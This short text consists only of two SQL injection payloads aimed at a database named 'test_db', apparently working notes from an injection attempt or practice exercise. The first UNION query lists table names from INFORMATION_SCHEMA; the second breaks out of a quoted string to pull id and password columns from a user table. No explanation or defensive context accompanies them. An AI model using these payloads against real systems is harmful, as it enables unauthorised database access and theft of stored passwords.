test_db
UNION select 1,TABLE_NAME,TABLE_SCHEMA,4,5,6,7,8,9 from INFORMATION_SCHEMA.TABLES where table_schema='test_db'-- -



' UNION select 1, id, password, 4, 5, 6, 7, 8, 9 from test_db.user-- -